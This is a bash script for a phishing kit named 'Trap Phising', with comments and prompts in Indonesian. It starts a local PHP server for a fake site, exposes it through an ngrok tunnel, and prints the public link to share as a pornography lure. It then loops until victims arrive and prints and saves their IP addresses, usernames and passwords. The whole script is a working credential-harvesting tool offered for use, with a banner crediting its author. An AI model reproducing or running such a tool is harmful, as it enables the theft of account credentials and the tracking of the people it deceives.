#!/bin/bash

hedygans(){
ip=$(grep -a 'IP:' site/$sever/ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip

cat site/$server/ip.txt >> saved.ip.txt
}

password(){
account=$(grep -o 'Account:.*' sites/$server/usernames.txt | cut -d " " -f2)
IFS=$'\n'
password=$(grep -o 'Pass:.*' sites/$server/usernames.txt | cut -d ":" -f2)
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Username:\e[0m\e[1;77m %s\n\e[0m" $account
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Password:\e[0m\e[1;77m %s\n\e[0m" $password
cat sites/$server/usernames.txt >> sites/$server/saved.usernames.txt
}


hedy(){
printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Menuggu targets,\e[0m\e[1;77m tekan Ctrl + C untuk kaluar...\e[0m\n"
while [ true ]; do


if [[ -e "site/$sever/ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Target open Bokep!\n"
hedygans
rm -rf site/$server/ip.txt

fi

sleep 0.5

if [[ -e "site/$server/usernames.txt" ]]; then
printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Target menulis!\n"
password

fi
sleep 1
done 

}

ngrok(){
printf "\e[1;92m[\e[0m+\e[1;92m]\033[1;38;5;208mStart php server su\033[31;1m(\033[37;1mHostpotnya Hidupin su!!\033[31;1m)\e[0m\e[1;77m(localhost:3333)\e[0m\e[1;92m...!!!\e[0m\n"
cd site/$server && php -S 0.0.0.0:3333 > /dev/null 2>&1 &
sleep 2
printf "\e[1;92m[\e[0m\e[1;77m+\e[1;92m]\033[1;38;5;208mStart ngrok server su\033[31;1m(\033[37;1mHotspot idupin\033[31;1m)\e[0m\e[1;77m(http 3333)\e[0m\e[1;92m...!!!\n"
./ngrok http 3333 > /dev/null 2>&1 &
sleep 8

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")

printf "\e[1;92m[\e[0m+\e[1;92m] Share bokep\e[0m\e[1;77mNekopoi\e[0m\e[1;92m link:\e[0m\e[1;77m %s\e[0m\n" $link
}





banner(){
      printf  "       ) _     _ "
      sleep 0.03
      printf '\n'
      printf  "      ( (^)-~-(^) "
      sleep 0.03
      printf '\n'
      printf  "  _ ,-.\_( 6 6 )__,-.___ "
      sleep 0.03
      printf '\n'
      printf  " | |'M'   \   /   'M'    "
      sleep 0.03
      printf '\n'
      printf  " | |_ _ __ >o< _ _ _   "
      sleep 0.03
      printf '\n'
      printf  " | __| '__/ _  | '_ \  "
      sleep 0.03
      printf '\n'
      printf  " | |_| | | (_| | |_) | "
      sleep 0.03
      printf '\n'
      printf  "  \__|_|  \__,_| .__/  "
      sleep 0.03
      printf '\n'
      printf  "               | |     "
      sleep 0.03
      printf '\n'
      printf  "               |_|    "
      sleep 0.03
      printf '\n'
      printf " ========================="
      sleep 2
      printf '\n'
      printf " ==    Trap Phising     =="
      sleep 0.7
      printf '\n'
      printf " ========================="
      printf '\n'
printf "\033[31;1m     .:| Author:\033[37;1mWhoMHw \033[31;1m|:. "
printf '\n'
printf "\033[34;1m    .:| Telegram:\033[37;1mHedy2\033[34;1m|:.    "
printf '\n'
printf "\033[32;1m[\033[33;1m*\033[32;1m]\033[37;1mYoutubme:https://www.youtube.com/channel/UChMIkGetnMB4qq9K5kNwkXA/featured"
printf '\n'
printf "\033[32;1m[\033[33;1m*\033[32;1m]\033[37;1mGithub:https://github.com/WhoMHw"
printf '\n'
sleep 0.03
printf "\033[32;1m[\033[33;1m*\033[32;1m]\033[37;1mInstagram:https://www.instagram.com/wong_biasa0723/"
printf "\n"
sleep 0.03
printf "\033[32;1m[\033[33;1m*\033[32;1m]\033[37;1mInstagram:https://www.instagram.com/siapa_namasaya23/"
printf '\n'
}

banner
ngrok
hedy
